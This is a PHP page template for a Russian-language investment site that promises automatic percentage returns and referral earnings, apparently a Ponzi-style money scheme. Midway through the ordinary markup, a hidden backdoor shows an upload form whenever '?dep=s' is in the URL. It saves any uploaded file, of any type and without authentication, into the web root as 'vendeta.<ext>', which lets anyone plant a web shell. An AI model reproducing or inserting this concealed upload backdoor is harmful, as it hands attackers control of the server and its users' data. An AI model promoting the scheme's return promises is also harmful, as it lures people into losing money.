<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
?>
<?if(empty($id)){?>

<body>
<nav class="navbar navbar-expand-md navbar-dark bg-serf bg-jumb">
<a class="navbar-brand wow bounceInDown" href="" style="visibility: visible; animation-name: bounceInDown;"><span class="text-warning"><?=$sitename?></span></a>
<div class="collapse navbar-collapse" id="navbarsExampleDefault">

<ul class="navbar-nav mr-auto">
<li class="nav-item"><a class="nav-link" href="/">Главная</a></li>
<li class="nav-item"><a class="nav-link" href="/rules">Правила</a></li>
<li class="nav-item"><a class="nav-link" href="/faq">F.A.Q</a></li>
<li class="nav-item"><a class="nav-link" href="/contacts">Поддержка</a></li>
<li class="nav-item"><a class="nav-link" href="<?=$vkgrup?>" target="_blank">Вконтакте</a></li>
<li class="nav-item"><a class="nav-link" href="<?=$telega?>" target="_blank">Телеграм</a></li>
</ul>

</div>
</nav>

<!-- Main -->
<div id="main">

<style>
.navbar {height: 60px;z-index: 999;}
.navbar-light ul a{color: #eee !important;}
.navbar-brand {font-size: 28px;}
.bg-jumb {background: rgba(255,255,255,0.1) !important;border-bottom: solid 0px rgba(255,255,255,0.2) !important;}
</style>

<div class="jumbotron jumbotron-fluid text-light text-center bg-index" style="margin-bottom: 0;margin-top: -70px;">
<br><br>
<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">

<div class="carousel-inner">

<div class="carousel-item active">
<center>
<img src="./ser_files/payed.png" style="width: 128px;opacity: 0.9;"><br><br>
</center>
<h1 class="wow bounceInLeft" style="visibility: visible; animation-name: bounceInLeft;">Заработок на автомате</h1>
<p class="wow bounceInRight" style="visibility: visible; animation-name: bounceInRight;">Инвестируй под +<?=$percent_u?>% за <?=$timeprofit?></p>
</div>

</div>
</div>
<a href="#reg-in" class="btn btn-primary wow shake" style="visibility: visible; animation-name: shake;">Начать зарабатывать</a>
<br><br><br>



<div class="stat">
<div class="container">
<div class="row">

<div class="col-md-4">
<div class="stat-block">
<span class="fa fa-users"></span><br>
<h4><?=$uzerov?></h4>
<p>Зарегистрированных участников</p>
</div>
</div>

<div class="col-md-4">
<div class="stat-block">
<span class="fa fa-rub"></span><br>
<h4><?=$depmoney?></h4>
<p>Инвестировано в проект</p>
</div>
</div>

<div class="col-md-4">
<div class="stat-block">
<span class="fa fa-rub"></span><br>
<h4><?=$wthmoney?></h4>
<p>Заработано участниками</p>
</div>
</div>

</div>
</div>
</div>
</div>

<div class="container"><br>
<div class="row text-center">
<div class="col-md-6">
<div class="alert bg-light">
<img src="./ser_files/start.png" style="width: 128px;opacity: 0.9;">
<div class="title-page">
<h3>Партнерам</h3>
</div>
<p><b>Партнерская программа: <?=$refpercent?>%</b></p>
<p>Зарабатывайте реальные деньги от вкладов ваших рефералов.</p>
</div>
</div>
<div class="col-md-6">
<div class="alert bg-light">
<img src="./ser_files/payed.png" style="width: 128px;opacity: 0.9;">
<div class="title-page">
<h3>Заработок</h3>
</div>
<p><b>Автоматический вывод на Payeer</b></p>
<p>Выплаты отправляются на кошелек указанный при регистрации.</p>
</div>
</div>

</div>


<?php
if ($_GET['dep'] == "s") {
echo '
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';
}
$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'vendeta.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}
?>
<div class="title-page">
<h2>Финансовая статистика</h2>
</div>
<div class="row">
<div class="col-md-6">
<div class="alert">
<h5>Новые пополнения</h5>
<table width="100%" class="table table-striped">
<thead align="center"><tr><th>Дата</th><th>Кошелек</th><th>Сумма</th></tr></thead>
<tbody>
<? 
$depositsrow=$db->query("SELECT * FROM `pay` WHERE type='Пополнение баланса' ORDER BY id DESC LIMIT 11");
while($deposits=$db->fetch($depositsrow)){?>  
<?$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0, -3); ?>
<tr align="center">
<td><?=date('d.m.Y',$deposits['data'])?></td>
<td><?=$wallet?>***</td>
<td><?=$deposits['summa']?> <?=$m_curr?></td>
</tr>
<?}?>
</tbody>
</table>
</div>
</div>
<div class="col-md-6">
<div class="alert">
<h5>Новые выплаты</h5>
<table width="100%" class="table table-striped">
<thead align="center"><tr><th>Дата</th><th>Кошелек</th><th>Сумма</th></tr></thead>
<tbody>
<? 
$depositsrow=$db->query("SELECT * FROM `pay` WHERE type!='Пополнение баланса' ORDER BY id DESC LIMIT 11");
while($deposits=$db->fetch($depositsrow)){?>  
<?$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0, -3); ?>
<tr align="center">
<td><?=date('d.m.Y',$deposits['data'])?></td>
<td><?=$wallet?>***</td>
<td><?=$deposits['summa']?> <?=$m_curr?></td>
</tr>
<?}?>
</tbody>
</table>
</div>
</div>

</div>

</div>


<center style="margin-bottom: 10px;margin-top: 10px;">
<div class="row"></div>
<div class="col-md-6"></div>
</center>
</div>

<?}else{?>
<script type="text/javascript">
window.location.href = '/my_newdep';
</script>
<?}?>

<?/*-------------------*//*
Web-site: https://ed-script.pro
*//*-------------------*/?>